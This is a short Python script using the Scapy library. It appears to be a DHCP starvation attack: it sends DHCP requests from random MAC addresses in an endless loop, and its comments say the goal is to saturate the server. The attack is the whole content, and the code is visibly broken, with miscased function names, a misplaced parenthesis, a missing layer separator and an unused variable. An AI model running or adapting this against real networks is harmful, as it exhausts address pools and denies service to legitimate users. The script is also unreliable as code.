import sys
from scapy.all import*

ip= RandIp("10.10.111.100-200") #Assigning a random variable ip to take up random ip address between the specified range

dhcp= Ether(src= RandMac(),dst="ff:ff:ff:ff:ff:ff"/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP DHCP(options=[("message-type","request"),"end"])
sendp (dhcp,loop=1)

#dhcp variable is used to make the server respond to random Mac addresses: also we are assigning dhcp options to message type and request. In the last statement we are making the dhcp to get into a loop to help generate as many as possible dhcp onnections to saturate the server.